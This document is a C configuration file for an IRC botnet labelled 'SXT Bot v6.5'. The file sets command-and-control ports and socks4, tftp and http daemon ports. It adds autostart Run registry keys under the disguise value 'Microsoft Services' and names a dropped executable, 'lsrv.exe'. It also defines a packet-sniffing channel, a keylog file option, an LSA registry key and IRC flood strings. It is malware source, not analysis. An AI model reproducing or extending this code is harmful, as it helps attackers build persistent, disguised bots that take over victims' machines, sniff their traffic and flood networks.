// bot configuration (generic) - doesn't need to be encrypted
int port = 6667;				// server port
int port2 = 6667;				// backup server port
int sock4port = 3230;			// Port # for sock4 daemon to run on  - CHANGE THIS!!!
int tftpport = 69;				// Port # for tftp daemon to run on
int httpport = 88;				// Port # for http daemon to run on
BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys
char prefix = '.';				// command prefix (one character max.)
int maxrand = 8;				// how many random numbers in the nick
//char keylogfile[] = "keys.txt";	// keylog filename

#ifdef DEBUG_LOGGING
char logfile[]="c:\\debug.txt";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!

#else										// Recommended to use this only for Crypt() setup, this is unsecure.

char botid[] = "loset";						// bot id
char version[] = "SXT Bot v6.5";			// Bots !version reply
char password[] = "";				// bot password
char server[] = "";				// server
char serverpass[] = "";						// server password
char channel[] = "##";				// channel that the bot should join
char chanpass[] = "";					// channel password
char server2[] = "";			// backup server (optional)
char channel2[] = "##";				// backup channel (optional)
char psniffchan[] = "##sn1ff#";				// sniffing channel
char chanpass2[] = "kaka32";					// backup channel password (optional)
char filename[] = "lsrv.exe";			// destination file name
char valuename[] = "Microsoft Services";	// value name for autostart
char nickconst[] = "Z";						// first part to the bot's nick
char szLocalPayloadFile[]="mserv.dat";		// Payload filename
char modeonconn[] = "+i";					// Can be more than one mode and contain both + and -

char *authost[] = {
	"*@l33t.gov"
};

char *versionlist[] = {
	"SXT Bot v6.5",
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "2poiwsfpf3213ew"; // CHANGE THIS!!! hmmm..Do I even need this now?
#endif

const char partline[] = "PaWaaPaWaaPaWaaPaWaaPaWaa"; //part floodline
const char floodline[] = "PaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaa"; // Flood line
